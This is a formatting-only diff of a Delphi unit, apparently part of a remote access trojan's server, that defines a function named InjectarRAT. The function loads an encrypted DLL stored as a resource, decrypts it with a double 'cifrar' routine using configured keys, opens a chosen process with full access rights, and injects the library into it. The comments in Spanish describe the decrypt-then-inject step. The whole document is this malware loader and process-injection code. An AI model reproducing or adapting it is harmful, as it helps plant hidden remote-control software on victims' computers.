@@ -1,4 +1,4 @@
-Unit Servidor;
+unit Servidor;
 
 interface
 uses
@@ -7,46 +7,46 @@ uses
   Variables,
   Funciones;
 
-  function InjectarRAT(ResName: string; pid: dword):boolean;
-  
+function InjectarRAT(ResName: string; pid: dword): Boolean;
+
 implementation
 
-function InjectarRAT(ResName: string; pid: dword):boolean;
-  var
-    ResourceLocation: HRSRC;
-    ResourceSize:     longword;
-    ResourceHandle:   THandle;
-    ResourcePointer:  Pointer;
-    handleWindow:     integer;
-    Tempstr:          string;
-  begin
-     Result := true;
-    //ResourceLocation := FindResource(HInstance, pchar('mi_dll'), RT_RCDATA);
-    ResourceLocation := FindResource(SysInit.HInstance, PChar(ResName), 'DLL');
-    //ShowMessage('es: '+IntTOStr(ResourceLocation));
-    if ResourceLocation <> 0 then
+function InjectarRAT(ResName: string; pid: dword): Boolean;
+var
+  ResourceLocation: HRSRC;
+  ResourceSize: Longword;
+  ResourceHandle: THandle;
+  ResourcePointer: Pointer;
+  handleWindow: Integer;
+  Tempstr: string;
+begin
+  Result := True;
+  //ResourceLocation := FindResource(HInstance, pchar('mi_dll'), RT_RCDATA);
+  ResourceLocation := FindResource(SysInit.HInstance, PChar(ResName), 'DLL');
+  //ShowMessage('es: '+IntTOStr(ResourceLocation));
+  if ResourceLocation <> 0 then
     begin
       ResourceSize := SizeofResource(SysInit.HInstance, ResourceLocation);
       if ResourceSize <> 0 then
-      begin
-        ResourceHandle := LoadResource(SysInit.HInstance, ResourceLocation);
-        if ResourceHandle <> 0 then
         begin
-          ResourcePointer := LockResource(ResourceHandle);
-          HandleWindow    := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
-          SetLength(tempstr, ResourceSize);
-          Move(ResourcePointer^,tempstr[1], ResourceSize);//copiamos a tempstr y desciframos
-          tempstr := cifrar(cifrar(tempstr, strtoint(configuracion.snumerocifrado2)), strtoint(configuracion.snumerocifrado));
-          InjectLibrary(HandleWindow, @tempstr[1]);   //inyectamos despues de descifrar
+          ResourceHandle := LoadResource(SysInit.HInstance, ResourceLocation);
+          if ResourceHandle <> 0 then
+            begin
+              ResourcePointer := LockResource(ResourceHandle);
+              HandleWindow := OpenProcess(PROCESS_ALL_ACCESS, False, pid);
+              SetLength(tempstr, ResourceSize);
+              Move(ResourcePointer^, tempstr[1], ResourceSize); //copiamos a tempstr y desciframos
+              tempstr := cifrar(cifrar(tempstr, StrToInt(configuracion.snumerocifrado2)), StrToInt(configuracion.snumerocifrado));
+              InjectLibrary(HandleWindow, @tempstr[1]); //inyectamos despues de descifrar
+            end
+          else
+            Result := False;
         end
-        else
-          Result := false;
-      end
       else
-        Result := false;
+        Result := False;
     end
-    else
-      result := false;
-  end;
+  else
+    Result := False;
+end;
 
 end.
